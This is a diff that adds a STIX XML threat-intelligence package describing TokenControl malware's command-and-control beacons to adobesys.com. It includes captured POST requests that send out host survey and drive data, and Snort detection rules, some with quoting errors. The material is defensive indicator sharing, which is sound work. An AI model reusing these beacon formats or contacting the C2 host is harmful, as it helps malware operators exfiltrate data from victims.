@@ -1,0 +1,60 @@
+<stix:STIX_Package xmlns:stix="http://stix.mitre.org/stix-1" xmlns:CISCP="http://us-cert.gov/ciscp" xmlns:URIObj="http://cybox.mitre.org/objects#URIObject-2" xmlns:cybox="http://cybox.mitre.org/cybox-2" xmlns:cyboxCommon="http://cybox.mitre.org/common-2" xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2" xmlns:indicator="http://stix.mitre.org/Indicator-2" xmlns:marking="http://data-marking.mitre.org/Marking-1" xmlns:simpleMarking="http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1" xmlns:stixCommon="http://stix.mitre.org/common-1" xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1" xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" id="CISCP:IB-15-10088" version="1.1.1" xsi:schemaLocation="http://cybox.mitre.org/objects#DomainNameObject-1 http://cybox.mitre.org/XMLSchema/objects/Domain_Name/1.0/Domain_Name_Object.xsd   http://cybox.mitre.org/objects#PortObject-2 http://cybox.mitre.org/XMLSchema/objects/Port/2.1/Port_Object.xsd   http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd   http://cybox.mitre.org/objects#WinRegistryKeyObject-2 http://cybox.mitre.org/XMLSchema/objects/Win_Registry_Key/2.1/Win_Registry_Key_Object.xsd   http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd   http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd   http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd   http://cybox.mitre.org/objects#SocketAddressObject-1 http://cybox.mitre.org/XMLSchema/objects/Socket_Address/1.1/Socket_Address_Object.xsd   http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd   http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd   http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd   http://cybox.mitre.org/objects#LinkObject-1 http://cybox.mitre.org/XMLSchema/objects/Link/1.1/Link_Object.xsd   http://cybox.mitre.org/objects#AddressObject-2 http://cybox.mitre.org/XMLSchema/objects/Address/2.1/Address_Object.xsd   http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd   http://cybox.mitre.org/objects#URIObject-2 http://cybox.mitre.org/XMLSchema/objects/URI/2.1/URI_Object.xsd   http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd   http://cybox.mitre.org/objects#EmailMessageObject-2 http://cybox.mitre.org/XMLSchema/objects/Email_Message/2.1/Email_Message_Object.xsd   http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1 http://stix.mitre.org/XMLSchema/extensions/marking/simple/1.1.1/simple_marking.xsd   http://cybox.mitre.org/objects#MutexObject-2 http://cybox.mitre.org/XMLSchema/objects/Mutex/2.1/Mutex_Object.xsd   http://cybox.mitre.org/objects#NetworkConnectionObject-2 http://cybox.mitre.org/XMLSchema/objects/Network_Connection/2.1/Network_Connection_Object.xsd      http://cybox.mitre.org/objects#HTTPSessionObject-2 http://cybox.mitre.org/XMLSchema/objects/HTTP_Session/2.1/HTTP_Session_Object.xsd   http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd"><stix:STIX_Header><stix:Title>Command and Control Sites Associated with TokenControl Malware</stix:Title><stix:Package_Intent xsi:type="stixVocabs:PackageIntentVocab-1.0">Indicators - Network Activity</stix:Package_Intent><stix:Description>TokenControl malware was installed on three compromised hosts on 7 January 2015 between 03:23 to 03:48 GMT and 10:28 to 11:35 GMT, then again on 8 January 2015 between 01:52 to 08:58 GMT. The TokenControl malware communicated with the domain adobesys.com, which was identified as a TokenControl command and control (C2) site in the US. The malware sent HTTP POST requests that contained survey information or system drive information about the compromised host.
+
+TokenControl malware was discussed previously in IB-14-10502.</stix:Description><stix:Handling><marking:Marking><marking:Controlled_Structure>//node()</marking:Controlled_Structure><marking:Marking_Structure color="AMBER" xsi:type="tlpMarking:TLPMarkingStructureType"/></marking:Marking><marking:Marking><marking:Controlled_Structure>//node()</marking:Controlled_Structure><marking:Marking_Structure xsi:type="simpleMarking:SimpleMarkingStructureType"><simpleMarking:Statement>FOUO</simpleMarking:Statement></marking:Marking_Structure></marking:Marking></stix:Handling><stix:Information_Source><stixCommon:Time><cyboxCommon:Produced_Time>2015-03-05T18:54:11Z</cyboxCommon:Produced_Time></stixCommon:Time></stix:Information_Source></stix:STIX_Header><stix:Indicators><stix:Indicator id="CISCP:indicator-122aa5de-0359-4f0d-b301-0d04a088638e" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Composite_Indicator_Expression operator="OR"><indicator:Indicator idref="CISCP:indicator-0bfcae1b-f338-4412-a375-dcd7ba795c92"/><indicator:Indicator idref="CISCP:indicator-ef363d0f-02d7-4006-b421-fd97f4fb69a9"/></indicator:Composite_Indicator_Expression></stix:Indicator><stix:Indicator id="CISCP:indicator-0bfcae1b-f338-4412-a375-dcd7ba795c92" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type><indicator:Description>The TokenControl malware sent the following POST requests to this site:
+
+POST /result?174536523 HTTP/1.1
+Host: adobesys.com
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.2) Gecko/50559 Firefox/3.0.1
+Pragma: no-cache
+Via: 1.1 du2prox1 (squid/3.1.10), 1.1 [REDACTED DOMAIN]:8080
+Cache-Control: max-age=259200
+Max-Forwards: 10
+Connection: Keep-Alive
+Content-Length: 112
+computer=BED7429 [[REDACTED USERNAME]]&amp;lanip=172.29.43.165&amp;uid=732280440b9fee2533408e32abaf53d3&amp;os=6,1,32&amp;relay=2&amp;data=
+
+POST /result?3098933075 HTTP/1.1
+Host: adobesys.com
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.2) Gecko/3088222327 Firefox/3.0.1
+Pragma: no-cache
+Via: 1.1 du2prox1 (squid/3.1.10), 1.1 [REDACTED DOMAIN]:8080
+Cache-Control: max-age=259200
+Max-Forwards: 10
+Connection: Keep-Alive
+Content-Length: 106
+computer=DUV4193 [[REDACTED USERNAME]]&amp;lanip=172.29.48.209&amp;uid=e3e49481d4616722de295af48a5c7b5c&amp;os=6,1,32&amp;relay=2&amp;data=
+
+POST /result?30644571 HTTP/1.1
+Host: adobesys.com
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.2) Gecko/17277703 Firefox/3.0.1
+Pragma: no-cache
+Via: 1.1 du2prox1 (squid/3.1.10), 1.1 [REDACTED DOMAIN]:8080
+Cache-Control: max-age=259200
+Max-Forwards: 10
+Connection: Keep-Alive
+Content-Length: 104
+computer=BED7362 [[REDACTED USERNAME]]&amp;lanip=10.226.36.10&amp;uid=732280440b9fee2533408e32abaf53d3&amp;os=6,1,32&amp;relay=2&amp;data=</indicator:Description><indicator:Observable id="CISCP:Observable-55979185-f5e0-4404-9c63-f822ce5042ca"><cybox:Object id="CISCP:Object-44c5a7db-b0a0-4514-a011-494765c3d227"><cybox:Properties type="URL" xsi:type="URIObj:URIObjectType"><URIObj:Value condition="Equals">http://adobesys.com/result?</URIObj:Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2015-01-07T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-ef363d0f-02d7-4006-b421-fd97f4fb69a9" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type><indicator:Description>The TokenControl malware sent the following POST request to this site:
+
+POST /drive HTTP/1.1
+Host: adobesys.com
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.2) Gecko/17277703 Firefox/3.0.1
+Pragma: no-cache
+Via: 1.1 du2prox1 (squid/3.1.10), 1.1 [REDACTED DOMAIN]:8080
+Cache-Control: max-age=259200
+Max-Forwards: 10
+Connection: Keep-Alive
+Content-Length: 28
+A:\|C:\|D:\|M:\|R:\|T:\|Z:\|
+
+The signatures below were written to detect traffic without SSL encryption. Additionally, creating a signature on the private key could help track and decrypt SSL traffic from this malware.
+
+Alert tcp any any &lt;&gt; any any (msg:"TokenControl:RESULT_POST_HOST_INFO_BCN";
+sid:124; content: "POST"; http_method; content:"/result?"; http_url;
+content:"computer=";content:"&amp;lanip="; distance:1; content:"&amp;uid="; distance:1;
+content:"&amp;relay="; distance:33;content:"&amp;data=;distance:1; pcre:"/\/result\?\d{7}/U";)
+
+Alert tcp any any -&gt; any [80,8080] (msg:TokenControl_Implant_UA"; content:"User-Agent: HttpBrowser/1.0"; sid 10143281;)</indicator:Description><indicator:Observable id="CISCP:Observable-44e971cf-4bb6-4aa6-a4cb-76a17d12d396"><cybox:Object id="CISCP:Object-969bb666-ed0c-48e1-92c1-573c498a27e0"><cybox:Properties type="URL" xsi:type="URIObj:URIObjectType"><URIObj:Value condition="Equals">http://adobesys.com/drive</URIObj:Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2015-01-07T00:00:00"/></indicator:Sightings></stix:Indicator></stix:Indicators><stix:TTPs><stix:Kill_Chains><stixCommon:Kill_Chain definer="LMCO" id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="LM Cyber Kill Chain" number_of_phases="7" reference="http://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf"><stixCommon:Kill_Chain_Phase name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/><stixCommon:Kill_Chain_Phase name="Weaponization" ordinality="2" phase_id="stix:KillChainPhase-445b4827-3cca-42bd-8421-f2e947133c16"/><stixCommon:Kill_Chain_Phase name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/><stixCommon:Kill_Chain_Phase name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/><stixCommon:Kill_Chain_Phase name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/><stixCommon:Kill_Chain_Phase name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/><stixCommon:Kill_Chain_Phase name="Actions on Objectives" ordinality="7" phase_id="stix:KillChainPhase-786ca8f9-2d9a-4213-b38e-399af4a2e5d6"/></stixCommon:Kill_Chain></stix:Kill_Chains></stix:TTPs></stix:STIX_Package>
